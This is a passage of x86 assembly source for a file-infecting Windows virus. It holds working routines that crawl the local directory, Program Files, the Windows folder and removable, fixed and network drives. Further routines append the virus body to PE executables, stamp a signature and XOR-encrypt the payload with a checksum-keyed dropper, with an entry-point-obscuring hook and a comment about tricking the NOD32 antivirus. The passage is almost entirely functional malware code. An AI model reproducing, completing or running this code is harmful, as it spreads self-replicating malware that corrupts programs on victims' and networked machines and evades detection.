;                                   begin infecting the LOCAL directory. It may be configured using the                         ;
;                                   OPT_USE_DEBUG_PAYLOAD option.                                                               ;
;                                                                                                                               ;
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
 
    DEBUG_PAYLOAD_BREAK
    mov     DWORD PTR eax, OPT_USE_DEBUG_PAYLOAD
    .IF eax==0                                          ; Is there a 1st gen DEBUG payload? if no, return to n gen payload
        jmp        _payload_crawl                       ; Normal program flow
    .ENDIF
    
;              »»» DEBUG PAYLOAD ««« 
    ;jmp        _subhost_payload
    ;jmp        _payload_enumerate_drives
    ;jmp        _payload_message
    ;jmp        _payload
    ;jmp        _payload_crawl
    ;jmp        _payload_prog_files
    ;jmp        _payload_crawl_windows
    ;jmp        _payload_enumerate_drives


; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»SUBHOST PAYLOAD»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
;                                                                                                                               ;
;                                   This is the nth generation payload. It will create a new thread at                          ;
;                                   _subhost_entry (main virus body subroutines) and it will return the                         ;
;                                   'host' thread to wherever the EPO engine installed the new call.                            ;
;                                                                                                                               ;
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

_subhost_payload:
    nop
;           »»» CREATE NEW THREAD ««« 
    mov     DWORD PTR eax, OFFSET _subhost_entry
    and     eax, 00000fffh                              ; Offset from entry point
    add     DWORD PTR eax, _shellcode_byte_zero         ; Absolute address
    push    NULL                                        ; lpThreadId
    push    NULL                                        ; dwCreationFlags
    mov     ebx, _fpool
    push    ebx                                         ; lpParameter
    push    eax                                         ; lpStartAddress
    push    NULL                                        ; dwStackSize
    push    NULL                                        ; lpThreadAttributes
    
;           »»» EXECUTE VIRUS BODY ««« 
    API_CALL f_createthread
    ; Determine host return address
    push    0
    API_CALL f_getmodulehandle                          ; Returns module MZ header
    mov     ebx, eax
    assume  ebx:ptr IMAGE_DOS_HEADER
    mov     WORD PTR ax, [ebx].e_oeminfo
    shl     eax, 16
    mov     WORD PTR ax, [ebx].e_oemid
    assume  ebx:nothing
    add     eax, ebx                                    ; Absolute address of host    

;           »»» RETURN TO HOST ««« 
    ;BREAK
    add     esp, INITIAL_STACK_SIZE                     ; Normalize stack
    mov     DWORD PTR [ebp + 36], eax
    pop     ebp
    
    popa                                                ; Restore registers

    nop
    ret                                                 ; Return!     
    ; The host thread should've returned to the original program, while
    ; the new thread executes the virus body.    
       
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

       
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»SUBHOST THREAD ENTRY»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

    ; _subhost_entry is the routine called by CreateThread - this is where the virus payload (infector) begins execution on
    ; the nth generation of the virus. Just to clarify: the first generation (originally assembled) is only one thread of 
    ; execution, while the 2nd, 3rd, etc... generations are all multithreaded.
_subhost_entry:
    mov     eax, [esp + 4]                              ; _fpool
    push    ebp
    mov     ebp, esp
    push    eax                                         ; _fpool
    sub     esp, PAYLOAD_STACK_SIZE
    SLEEP PAYLOAD_SLEEP

; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»PAYLOAD ENTRY»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

_payload:
    nop
    ; Probably a good place to install a custom payload, if required.

;           »»» Crawl Local Directory ««« 
_payload_crawl:
    ALLOC_MEM SEEK_MAX_CURRENT_DIR_BUF                  ; Memory for current directory string
    mov     DWORD PTR _directory_pool, eax              ; Commit to stack
    push    eax                                         ; Save to stack for removal
    push    eax                                         ; lpBuffer
    push    SEEK_MAX_CURRENT_DIR_BUF                    ; Length
    API_CALL f_getcurrentdirectory                      ; DWORD WINAPI GetCurrentDirectory(
                                                        ;               __in   DWORD nBufferLength,
                                                        ;               __out  LPTSTR lpBuffer
    pop     esi                                         ; String containing current directory
    mov     eax, _fpool                                 ; Load in _fpool
    call    _routine_seek                               ; Initiate directory traversal
    mov     DWORD PTR eax, _directory_pool            
    FREE_MEM eax                                        ; Free Directory pool    
    
    ; DEBUG (SLEEP FOREVER AFTER INFECTING LOCAL DIRECTORIES)
    ;BREAK
    ;SLEEP 0
    
;           »»» PROGRAM FILES ««« 
_payload_prog_files:
    call    _payload_prog_files_delta
_payload_prog_files_delta:
    pop     esi
@p0:
    ; > Find MISC String pool (Where the search strings are located)
    lodsb
    cmp     BYTE PTR al, 'P'
    jne     @p0
    dec     esi
    mov     DWORD PTR eax, [esi]
    inc     esi
    xor     DWORD PTR eax, 0b4c9a3e4h
    cmp     DWORD PTR eax, 0F886ECB4h
    jne     @p0
    mov     BYTE PTR al, 090h
    mov     edi, esi
    xor     ecx, ecx
    dec     ecx
    repne   scasb
    add     edi, STRINGS_NOP_BUFFER
    dec     edi
    mov     DWORD PTR _raw_strings_pool, edi
    add     DWORD PTR edi, S_PROG_FILES
    xor     ecx, ecx
    push    ecx
    pop     eax                                         ; Zero ecx/eax
    dec     ecx
    cld
    repne   scasb                                       ; Length of string
    neg     ecx
    ALLOC_MEM ecx
    mov     DWORD PTR _directory_pool, eax              ; Commit to stack
    mov     esi, edi
    mov     edi, eax                                    ; Destination pool
    sub     esi, ecx
    inc     esi
    mov     DWORD PTR _search_string0, esi
    rep     movsb                                       ; Copy string to pool
    mov     DWORD PTR esi, _directory_pool              ; Location to search
    mov     DWORD PTR eax, _fpool                       ; function pointer pool
    call    _routine_seek                               ; Start seek routine
    mov     DWORD PTR eax, _directory_pool
    FREE_MEM eax                                        ; Free directory pool
    ;SLEEP     INFINITE                                 ; Sleep after all routines have completed
    
;           »»» WINDOWS DIRECTORY ««« 
_payload_crawl_windows:
    mov     DWORD PTR edi, _search_string0
    xor     al, al                                      ; Zero al
    dec     ecx
    cld
    repne   scasb                                       ; edi @ windows string
    push    edi
    xor     ecx, ecx                                    ; Zero ecx
    dec     ecx
    repne   scasb
    neg     ecx
    pop     edi
    ALLOC_MEM 512
    mov     DWORD PTR _directory_pool, eax
    mov     DWORD PTR esi, eax
    xchg    esi, edi
    mov     eax, edi
    push    ecx
    mov     ecx, 512
    call    _routine_zero_memory                        ; Zero the pool
    pop     ecx
    rep     movsb                                       ; Copy string
    mov     DWORD PTR esi, _directory_pool
    mov     DWORD PTR eax, _fpool
    call    _routine_seek                               ; Infect
    
    mov        DWORD PTR eax, _directory_pool
    FREE_MEM eax                                        ; Free directory pool
    
;           »»» ENUMERATE DRIVE LETTERS ««« 
    ; This will infect USB/Network drives + any other fixed data disk
_payload_enumerate_drives:
    nop

    ; > "C:\0"
    mov     cl, 041h                                    ; Load first drive letter into eax
@d0:
    mov     DWORD PTR eax, 005c3a00h                    ; Load :\
    mov     BYTE PTR al, cl                             ; Load drive letter
    push    ecx                                         ; Save
    push    eax
    push    esp                                         ; LPCTSTR lpRootPathName
    API_CALL f_getdrivetype
    
    ; > Test result
    cmp     DWORD PTR eax, DRIVE_REMOVABLE
    je      _d0_drive_found
    cmp      DWORD PTR eax, DRIVE_FIXED
    je      _d0_drive_found
    cmp     DWORD PTR eax, DRIVE_REMOTE
    je      _d0_drive_found

@d0_res:
    pop     eax                                         ; Remove previous string
@d0_res1:
    pop     ecx                                         ; Previous cl value
    inc     cl
    cmp     BYTE PTR cl, 043h                           ; do not include C: drive
    jne     @d0_res0
    inc     cl                                          ; Otherwise, move to next drive letter
@d0_res0:
    cmp     cl, 5ah                                     ; 'Z'
    jng     @d0                                         ; Loop if not greater
    jmp     _d0_end
_d0_drive_found:
    ALLOC_MEM 512                                       ; Allocate memory for the directory buffer
    mov     DWORD PTR _directory_pool, eax              ; Commit to stack
    pop     edx                                         ; Drive letter
    mov     DWORD PTR [eax], edx                        ; Save to pool
    mov     BYTE PTR [eax + 2], 0                       ; Remove trailing slash
    mov     esi, eax
    mov     DWORD PTR eax, _fpool
    call    _routine_seek                               ; Call directory enumerator
    jmp     @d0_res1
    
_d0_end:
    nop

_payload_message:
    ; Resolve USER32
    ;BREAK

;           »»» RETURN/SLEEP PROCEDURE ««« 
_subhost_return:
    ;BREAK    ; FIXME
    BREAK_AT_END
    SLEEP   INFINITE
    mov     DWORD PTR eax, _fpool 
    FREE_MEM eax                                        ; Free Function Pointer Pool
    
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;







; »»»SUBROUTINE: INFECT IMAGE (_routine_infect_image)»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
;                                                                                                                               ;
;                                                                                                                               ;
; Image modification procedure:                                                                                                 ;
;                                                                                                                               ;
;    [0x0] Test Binary Type or Assembly                                                                                         ;
;        -> MZ/PE Signature test                                                                                                ;
;        -> UPX & other packers test                                                                                            ;
;        -> Test validity of first segment header                                                                               ;
;        -> Test if there are any segments                                                                                      ;
;        -> Test 64-bit binaries                                                                                                ;
;        -> Image size is tested by _routine_load_image and configured by READ_MAX_IMAGE_SIZE                                   ;
;                                                                                                                               ;    
;    [0x1] Append Payload to last section of binary (or last-to-last)                                                           ;
;        -> Determine size needed to install body                                                                               ;
;        -> Allocate memory for new image                                                                                       ;
;        -> Copy headers (including segment headers)                                                                            ;
;        -> Copy segments (this should be an exact clone of the original image + extra padding for the virus body)              ;
;        -> Append body to last segment                                                                                         ;
;        -> Update SizeOfImage                                                                                                  ;
;        -> Update segment header sizes                                                                                         ;
;        -> Stamp in signature                                                                                                  ;
;                                                                                                                               ;
;    [0x2] XOR Phase 2 -> Whole payload is XOR'd                                                                                ;
;        -> Generate 32-bit XOR key                                                                                             ;
;        -> Stamp-in dropper values (run CRC checksum)                                                                          ;
;        -> Note: if the phase 2 dropper is modified, the checksum will change to produce the wrong decryption key.             ;
;        -> XOR body                                                                                                            ;
;                                                                                                                               ;
;    [0x3] EPO                                                                                                                  ;
;        -> In summary, EPO modifies a call instruction to point to the phase 1 dropper (which is also installed by EPO).       ;
;            A chain of jumps will be installed in the code segment padding, including the dropper that will decrypt the        ;
;            body (including the phase 2 dropper). All in all, the body is XOR'd twice.                                         ;
;                                                                                                                               ;
;    [0x4] Finalize Image                                                                                                       ;
;        -> Modify the RWX permissions on the modified segment                                                                  ;
;        -> If there is any end of file data, append it to the final image (this will include resouces/manifests)               ;
;        -> Update some more header information                                                                                 ;
;        -> Adjust size of initialized data                                                                                     ;
;        -> Write image to the disk                                                                                             ;
;        -> Set modify time                                                                                                     ;
;                                                                                                                               ;
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

_routine_infect_image:
    push    ebp
    mov     ebp, esp
    sub     esp, INFECT_STACK_SIZE
    pusha
    lea     eax, [esp + 20h]
    mov     ecx, INFECT_STACK_SIZE
    call    _routine_zero_memory                        ; Zero the stack
    popa
    mov     DWORD PTR _fpool, eax                       ; Commit to stack
    mov     DWORD PTR _infect_target_string, esi        ; Commit to stack
    xchg    eax, esi
    call    _routine_load_image                         ; Load image into a buffer
    ; eax = address of pool, ecx = original file size
    cmp     eax, 0                                      ; Check if fail occured
    je      _infect_fail_read                           ; Read Fail occured
    mov     DWORD PTR _infect_orig_file_buffer, eax     ; Commit to stack
    mov     DWORD PTR _infect_orig_file_size, ecx       ; Commit to stack
    mov     DWORD PTR _infect_file_handle, ebx          ; Commit to stack
    

; »»»PHASE 0x0: Test binary image»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

    mov     ebx, eax
    xor     eax, eax
    mov     WORD PTR ax, [ebx]                          ; Load first two bytes of image into ax register
    cmp     WORD PTR ax, 'ZM'                           ; Test
    jne     _infect_fail_headers
    assume  ebx:ptr IMAGE_DOS_HEADER
    mov     DWORD PTR eax, [ebx].e_lfanew
    cmp     DWORD PTR eax, 1024                         ; Is the e_lfanew value more or less correct?
    jg      _infect_fail_headers
    lea     eax, [ebx + eax]
    assume  ebx:nothing
    mov     DWORD PTR _infect_orig_pe_hdr_abs, eax      ; Commit then test
    mov     WORD PTR ax, [eax]                          ; Load PE Signature
    cmp     WORD PTR ax, 'EP'
    jne     _infect_fail_headers 

;           »»» Test Signature ««« 
    assume  ebx:ptr IMAGE_DOS_HEADER
    mov     WORD PTR ax, [ebx].e_cs                     ; Signature
    cmp     WORD PTR ax, VIRUS_SIGNATURE
    je      _infect_fail_sig_detected
    assume  ebx:nothing

;           »»» Test winupack «««
    mov     DWORD PTR ebx, _infect_orig_file_buffer     ; PE Header
    mov     DWORD PTR eax, [ebx + 2]                    ; should be 'KERN' if winupack binary
    cmp     DWORD PTR eax, 'NREK'
    je      _infect_fail_headers

;           »»» Test UPX ««« 
    mov     DWORD PTR ebx, _infect_orig_pe_hdr_abs      ; PE Header
    add     DWORD PTR ebx, OFFSET_TO_FIRST_SEGMENT      ; First Segment Header
    mov     DWORD PTR eax, [ebx]                        ; Load name
    and     DWORD PTR eax, 00ffffffh                    ; Remove UPX value
    cmp     DWORD PTR eax, 00585055h                    ; UPX0
    je      _infect_fail_upx_signature

;           »»» Test if the first segment name is NULL ««« 
    cmp     DWORD PTR eax, 0
    je      _infect_fail_null_first_segment

;           »»» Test if there are any segments ««« 
    sub     DWORD PTR ebx, OFFSET_TO_FIRST_SEGMENT      ; Move back to PE header
    assume  ebx:ptr IMAGE_NT_HEADERS
    xor     eax, eax                                    ; Zero
    mov     WORD PTR ax, [ebx].FileHeader.NumberOfSections        ; Load
    assume  ebx:nothing
    test    al, al                                      ; Zero segments?
    je      _infect_fail_headers

;           »»» Test if there is only one segment ««« 
    cmp     DWORD PTR eax, 1                            ; Only one segment?
    je      _infect_fail_headers

;           »»» Test 64-bit binaries ««« 
    mov     DWORD PTR ebx, _infect_orig_file_buffer     ; MZ Header
    assume  ebx:ptr IMAGE_DOS_HEADER
    mov     DWORD PTR eax, [ebx].e_lfanew
    add     ebx, eax
    add     ebx, 4
    assume  ebx:nothing
    mov     WORD PTR ax, [ebx]                          ; IMAGE_FILE_HAEDER.Machine (WORD)
    cmp     WORD PTR ax, 08664h                         ; Test 64-bit binary
    je      _infect_fail_64_bit_binary
    assume  ebx:nothing

    ;BREAK
    

    ; Note: the size of the binary is tested in subroutine _routine_load_image. If the image exceeds READ_MAX_IMAGE_SIZE,
    ; the function will return a read error.

comment /*
;           »»» Test alignment buffer ««« 
    mov     DWORD PTR ebx, _infect_orig_pe_hdr_abs
    assume  ebx:ptr IMAGE_NT_HEADERS
    mov     DWORD PTR eax, [ebx].OptionalHeader.FileAlignment
    mov     DWORD PTR _infect_filealignment, eax        ; Commit to stack
    add     DWORD PTR ebx, 0f8h                         ; Move to first segment
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     DWORD PTR eax, _infect_orig_file_buffer
    add     DWORD PTR eax, [ebx].Misc.VirtualSize
    add     DWORD PTR eax, [ebx].PointerToRawData
    add     ebx, SIZEOF IMAGE_SECTION_HEADER
    mov     edx, _infect_orig_file_buffer
    add     DWORD PTR edx, [ebx].PointerToRawData
    xchg    edx, eax
    sub     eax, edx
    cmp     eax, EJCE_MIN_ALIGN_BUFFER
    jng     _infect_align_ok
    assume  ebx:ptr nothing
    mov     DWORD PTR ebx, EJCE_CHAIN_FRAME_SIZE
    inc     eax
    xor     edx, edx
    idiv    ebx
    sub     DWORD PTR eax, EJCE_CHAIN_REDUCE
    cmp     DWORD PTR eax, EJCE_MIN_CHAINS
    jg      _infect_align_ok
    nop

;           »»» Expand Sections ««« 
    mov     DWORD PTR ebx, _infect_orig_pe_hdr_abs      ; PE Header
    mov     eax, SIZEOF IMAGE_SECTION_HEADER
    xor     ecx, ecx
    xor     edx, edx
    mov     WORD PTR cx, [ebx + 06h]
    mov     DWORD PTR _infect_numberofsections, ecx     ; Commit to stack
    dec     ecx
    imul    ecx
    add     DWORD PTR ebx, 0f8h
    add     ebx, eax                                    ; Last section header

    assume  ebx:ptr IMAGE_SECTION_HEADER

    ALLOC_MEM INFECT_TEMP_BUFFER_SIZE                   ; Allocate temporary pool
    mov     DWORD PTR _infect_seg_buffer_temp, eax      ; Commit to stack

    ; Shift EOF data
    mov     DWORD PTR eax, [ebx].PointerToRawData
    add     DWORD PTR eax, [ebx].SizeOfRawData
    cmp     eax, _infect_orig_file_size
    je      @infect_copy_section


    ;FIXME
    ;BREAK


    ; Copy section
@infect_copy_section:
    mov     DWORD PTR eax, _infect_seg_buffer_temp
    mov     DWORD PTR ecx, INFECT_TEMP_BUFFER_SIZE
    call    _routine_zero_memory
    mov     edi, eax                                    ; Set destination
    mov     DWORD PTR esi, _infect_orig_file_buffer
    add     DWORD PTR esi, [ebx].PointerToRawData
    mov     DWORD PTR ecx, [ebx].SizeOfRawData
    call    _routine_byte_copy                          ; Copy segment from original file into temporary pool
    mov     eax, esi
    call    _routine_zero_memory                        ; Zero original segment
    add     DWORD PTR esi, _infect_filealignment        ; Increase by alignment value
    xchg    esi, edi
    call    _routine_byte_copy                          ; Copy segment from temp pool into original file

    ; Adjust header
    mov     DWORD PTR eax, [ebx].PointerToRawData
    add     DWORD PTR eax, _infect_filealignment
    mov     DWORD PTR [ebx].PointerToRawData, eax       ; Commit to header

    sub     DWORD PTR ebx, SIZEOF IMAGE_SECTION_HEADER  ; next header
    assume  ebx:nothing
    mov     DWORD PTR eax, _infect_numberofsections
    dec     eax
    mov     DWORD PTR _infect_numberofsections, eax     ; Commit to stack
    cmp     DWORD PTR eax, 1
    jne     @infect_copy_section

;           »»» Expand .text segment ««« 
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     DWORD PTR eax, [ebx].SizeOfRawData
    add     DWORD PTR eax, _infect_filealignment        ; Increment
    mov     DWORD PTR [ebx].SizeOfRawData, eax          ; Commit to header

    FREE_MEM _infect_seg_buffer_temp
    assume  ebx:nothing

;           »»» Adjust image headers «««
    mov     DWORD PTR ebx, _infect_orig_pe_hdr_abs      ; PE Headers
    assume  ebx:ptr IMAGE_NT_HEADERS
    mov     DWORD PTR eax, [ebx].OptionalHeader.SizeOfImage
    add     DWORD PTR eax, _infect_filealignment
    mov     DWORD PTR [ebx].OptionalHeader.SizeOfImage, eax

    assume  ebx:nothing
/*

_infect_align_ok:
; »»»PHASE 0x0: COMPLETE»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
    

                                                            ; * * * ;

    
; »»»PHASE 0x1: INSTALL SHELLCODE»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
    
    mov     DWORD PTR ebx, _infect_orig_pe_hdr_abs      ; Move pointer to PE Header to ebx register
    xor     eax, eax
    mov     WORD PTR ax, [ebx + 6]                      ; NumberOfSections
    mov     DWORD PTR _infect_numberofsections, eax     ; Commit to stack
    inc     eax
    sub     eax, 2                                      ; Trick NOD32
    imul    eax, 28h                                    ; Section offset
    add     eax, _infect_orig_pe_hdr_abs                
    add     eax, OFFSET_TO_FIRST_SEGMENT                ; Absolute address of Last Header
    mov     DWORD PTR _infect_orig_last_seg_abs, eax    ; Commit to stack
    assume  eax:ptr IMAGE_SECTION_HEADER
    mov     DWORD PTR eax, [eax].SizeOfRawData
    mov     DWORD PTR _infect_last_seg_orig_size, eax   ; Commit to stack
    assume  eax:nothing
    pusha
    call    _routine_compute_shellcode_length           ; Get total size of payload
    mov     DWORD PTR _infect_shellcode_length, ecx     ; Commit to stack
    mov     DWORD PTR _infect_shellcode_entry, eax      ; Entry point of shellcode (absolute)
    popa
    mov     DWORD PTR ebx, _infect_orig_pe_hdr_abs
    mov     DWORD PTR eax, _infect_orig_file_size
    add     DWORD PTR eax, _infect_shellcode_length     ; Total size of image
    add     DWORD PTR eax, MODIFIED_POOL_PREALIGNMENT
    mov     DWORD PTR _infect_mod_file_size, eax        ; FIXME - ALIGN PROPERLY
    ALLOC_MEM eax
    mov     DWORD PTR _infect_mod_file_buffer, eax      ; Commit to stack    
    
;           »»» Copy Headers ««« 
    mov     DWORD PTR ebx, _infect_orig_pe_hdr_abs      ; PE Header
    assume  ebx:ptr IMAGE_NT_HEADERS
    mov     DWORD PTR ecx, [ebx].OptionalHeader.SizeOfHeaders ; Size
    mov     DWORD PTR esi, _infect_orig_file_buffer     ; Source
    mov     DWORD PTR edi, _infect_mod_file_buffer      ; Destination
    assume  ebx:nothing
    call    _routine_byte_copy                          ; Copy headers
    
;           »»» Get address of new header ««« 
    sub     DWORD PTR ebx, _infect_orig_file_buffer     ; Remove base
    add     DWORD PTR ebx, _infect_mod_file_buffer      ; Absolute address
    mov     DWORD PTR _infect_mod_pe_hdr_abs, ebx       ; Commit to stack

;           »»» Copy all segments ««« 
    add     DWORD PTR ebx, OFFSET_TO_FIRST_SEGMENT - SIZEOF IMAGE_SECTION_HEADER
    assume  ebx:ptr IMAGE_SECTION_HEADER
    xor     ecx, ecx
    push    ecx


@@l10:
    add     DWORD PTR ebx, SIZEOF IMAGE_SECTION_HEADER   ; move to section header
    assume  ebx:nothing
    mov     DWORD PTR eax, [ebx]
    assume  ebx:ptr IMAGE_SECTION_HEADER
    cmp     eax, 0
    je      __end_l10
    pop     ecx
    inc     ecx
    cmp     DWORD PTR ecx, _infect_numberofsections
    jg      __end_l10
    push    ecx
    mov     DWORD PTR ecx, [ebx].SizeOfRawData          ; Size
    cmp     DWORD PTR ecx, 0                            ; Copy only if segment size > 0
    je      @@l10
    mov     DWORD PTR esi, [ebx].PointerToRawData
    mov     edi, esi
    add     DWORD PTR esi, _infect_orig_file_buffer     ; Source
    add     DWORD PTR edi, _infect_mod_file_buffer      ; Destination
    call    _routine_byte_copy
    jmp     @@l10
__end_l10:    
    
;           »»» Append Payload to last segment ««« 
    mov     DWORD PTR esi, _infect_shellcode_entry      ; Source (shellcode)
    sub     DWORD PTR ebx, SIZEOF IMAGE_SECTION_HEADER  ; Last segment
    mov     DWORD PTR edi, [ebx].PointerToRawData       ; Raw offset
    add     DWORD PTR edi, [ebx].SizeOfRawData          ; End of last segment
    cmp     DWORD PTR edi, 0                            ; NULL Values? (securom and other packers exhibit this - avoid infection
                                                        ; to prevent damage to the program)
    je      _infect_fail_headers 
    add     DWORD PTR edi, _infect_mod_file_buffer      ; Destination
    assume  ebx:nothing
    mov     DWORD PTR ecx, _infect_shellcode_length     ; Size
    call    _routine_byte_copy
    mov     DWORD PTR _infect_mod_shellcode_abs, edi    ; Commit to stack        
    
;           »»» Update Image Size (Modified Pool Size) ««« 
    mov     DWORD PTR ebx, _infect_mod_pe_hdr_abs       ; Absolute address of pe header
    assume  ebx:ptr IMAGE_NT_HEADERS
    mov     DWORD PTR edx, [ebx].OptionalHeader.FileAlignment
    assume  ebx:nothing
    xor     ecx, ecx
@@l00:
    add     ecx, edx
    cmp     DWORD PTR ecx, _infect_shellcode_length
    jng     @@l00    
    sub     ecx, _infect_shellcode_length               ; Total size of alignment padding
    mov     DWORD PTR _infect_alignment_padding, ecx    ; Commit to stack
    add     ecx, _infect_shellcode_length
    add     ecx, _infect_orig_file_size
    mov     DWORD PTR _infect_mod_file_size, ecx        ; Commit to stack
    
;           »»» Adjust size of modified segment «««   
    mov     DWORD PTR ebx, _infect_orig_last_seg_abs
    sub     ebx, _infect_orig_file_buffer
    add     ebx, _infect_mod_file_buffer                ; Absolute last segment header
    mov     DWORD PTR _infect_mod_last_seg_abs, ebx     ; Commit to stack
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     DWORD PTR ecx, [ebx].SizeOfRawData
    add     ecx, _infect_shellcode_length
    add     ecx, _infect_alignment_padding
    mov     DWORD PTR [ebx].SizeOfRawData, ecx          ; Update header

;           »»» Adjust Segment Virtual Size ««« 
    assume  ebx:nothing
    mov     DWORD PTR eax, [ebx + 08h]                  ; PhysicalAddress/Virtual Size
    add     eax, _infect_alignment_padding
    add     eax, _infect_shellcode_length
    mov     DWORD PTR [ebx + 08h], eax                  ; Update Header
    
;           »»» Update SizeOfImage ««« 
    ;BREAK
    ; VOffset + VSize of last section, then round up with SectionAlignment
    mov     DWORD PTR ebx, _infect_mod_last_seg_abs
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     DWORD PTR eax, [ebx].VirtualAddress
    add     DWORD PTR eax, [ebx].Misc.VirtualSize
    assume  ebx:ptr nothing
    mov     DWORD PTR ebx, _infect_mod_pe_hdr_abs
    assume  ebx:ptr IMAGE_NT_HEADERS
    mov     DWORD PTR edx, [ebx].OptionalHeader.SectionAlignment
    neg     edx
    and     eax, edx
    add     eax, [ebx].OptionalHeader.SectionAlignment  ; eax = SizeOfImage
    mov     DWORD PTR [ebx].OptionalHeader.SizeOfImage, eax
    
;           »»» Write Signature ««« 
    mov     DWORD PTR ebx, _infect_mod_file_buffer      ; MZ Header
    assume  ebx:ptr IMAGE_DOS_HEADER
    mov     WORD PTR [ebx].e_cs, VIRUS_SIGNATURE        ; Commit signature
    assume  ebx:nothing
    
; »»»PHASE 0x1: COMPLETE»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;


                                                            ; * * * ;


; »»»PHASE 0x2: INVOKE PHASE 2 X0R»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

    ; How this works:
    ; [+] Generate 32-bit key
    ; [+] Stamp XOR Key to dropper
    ; [+] Stamp Payload OEP to dropper
    ; [+] ELF32 Sum on dropper
    ; [+] XOR Payload
    ;    => ELF32 XOR RNG32
    ; Essentially, a correct checksum is needed for the dropper to produce the correct decryption key.
    call    _routine_gen_key                            ; Generate a 32-bit key
    mov     DWORD PTR _infect_xor_key, eax              ; Commit to stack
    
;           »»» Compute length of PAYLOAD (Shellcode OEP to PHS2 Signature - not incl) ««« 
    mov     DWORD PTR ebx, _infect_orig_last_seg_abs
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     DWORD PTR eax, [ebx].PointerToRawData
    add     DWORD PTR eax, [ebx].SizeOfRawData
    assume  ebx:nothing
    add     DWORD PTR eax, _infect_mod_file_buffer
    mov     ebx, eax                                    ; Pointer to modified buffer shellcode OEP
    xor     ecx, ecx
    dec     ecx
@@L0:
    inc     ecx
    mov     BYTE PTR al, [ebx + ecx]
    cmp     BYTE PTR al, 'P'
    jne     @@L0
    mov     DWORD PTR eax, [ebx + ecx]
    xor     eax, 0fcca4441h                             ; PHS2 SIGNATURE
    cmp     DWORD PTR eax, 0ce990c11h                   ; //
    jne     @@L0
    dec     ecx
    mov     DWORD PTR _infect_payload_size, ecx         ; Commit to stack
    
;           »»» Compute length of Dropper ««« 
    add     ebx, ecx                                    ; PHS2 SIGNATURE
    add     ebx, 5                                        ; DROPPER OEP
    xor     ecx, ecx
    dec     ecx
@@L1:
    inc     ecx
    mov     BYTE PTR al, [ebx + ecx]
    cmp     BYTE PTR al, 'L'
    jne     @@L1
    mov     DWORD PTR eax, [ebx + ecx]
    xor     eax, 0fbfbfbfbh                             ; LAME SIGNATURE (LIMIT)
    cmp     DWORD PTR eax, 0beb6bab7h                   ; //
    jne     @@L1
    dec     ecx                                         ; Do not include Signature in checksum
    mov     DWORD PTR _infect_dropper_size, ecx         ; Commit to stack
    push    ecx
    push    ebx

;           »»» STAMP IN DROPPER VALUES ««« 
    mov     DWORD PTR eax, _infect_payload_size
    mov     DWORD PTR [ebx + INFECT_OFST_OEP], eax      ; Payload size which computes offset to payload OEP
    mov     DWORD PTR eax, _infect_xor_key              ; XOR Key (32-bit RNG)
    mov     DWORD PTR [ebx + INFECT_OFST_DRP_KEY], eax  ; //
    
;           »»» CRC32: Dropper (eax = dropper entry point, ecx = count) ««« 
    pop     eax
    pop     ecx
    call    _crc32                                      ; ELF32 SUM for dropper code
    xor     eax, _infect_xor_key
    push    eax
    
;           »»» XOR Payload ««« 
    nop
    mov     DWORD PTR ebx, _infect_mod_shellcode_abs
    mov     DWORD PTR edx, _infect_payload_size
    sub     edx, 8                                      ; Do not XOR the signature
    xor     ecx, ecx
    pop     edi                                         ; XOR Key [ELF32+32RNG]
    sub     ecx, 4
@@L2:
    add     ecx, 4
    xor     [ebx + ecx], edi
    cmp     ecx, edx
    jng     @@L2    
